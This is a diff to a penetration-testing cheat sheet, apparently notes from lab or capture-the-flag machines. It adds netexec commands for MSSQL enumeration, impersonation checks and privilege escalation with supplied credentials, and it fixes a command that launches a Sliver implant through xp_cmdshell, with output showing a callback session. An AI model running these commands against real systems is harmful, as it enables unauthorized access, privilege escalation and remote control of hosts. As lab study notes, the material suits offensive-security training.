@@ -83,6 +83,34 @@ SMB         10.10.11.35     445    CICADA-DC        [+] CICADA\michael.wrightson
 
 ### MSSQL&#x20;
 
+* MSSQL Enumeration with netexec
+* Permissions enumeration
+
+```
+nxc mssql $ip -u external_user -p 'password123' -M mssql_priv                     
+
+MSSQL       10.13.38.11     1433   COMPATIBILITY    [*] Windows 10 / Server 2019 Build 17763 (name:COMPATIBILITY) (domain:intranet.poo)
+MSSQL       10.13.38.11     1433   COMPATIBILITY    [-] intranet.poo\external_user:password123
+```
+
+* Attempt to enumerate user impersonation
+
+```
+nxc mssql $ip -u external_user -p 'password123' -M enum_impersonate --local-auth
+```
+
+* enumerate users with active login sessions
+
+```
+nxc mssql $ip -u external_user -p 'password123' -M enum_logins --local-auth
+```
+
+* attempt to priv esc with mssql
+
+```
+nxc mssql $ip -u external_user -p 'password123' -M mssql_priv -o Action=privesc  --local-auth
+```
+
 * Access MSSQL and run a command with a password&#x20;
 
 ```
@@ -96,7 +124,7 @@ MSSQL       172.16.1.5      1433   DANTE-SQL01      nt service\mssql$sqlexpress
 * kick off a sliver implant in the background&#x20;
 
 ```
-./nxc mssql 172.16.1.5 -u sophie -p thisisagoodpassword-X 'cmd.exe /c start /b C:\Windows\System32\spool\drivers\color\security.exe' --local-auth
+./nxc mssql 172.16.1.5 -u sophie -p thisisagoodpassword -X 'cmd.exe /c start /b C:\Windows\System32\spool\drivers\color\security.exe' --local-auth
 [*] Session b00d3dc6 dante-dc01 - 10.10.14.3:33086 (DANTE-SQL01) - windows/amd64 - Sun, 19 May 2024 13:48:24 EDT
 ```
 
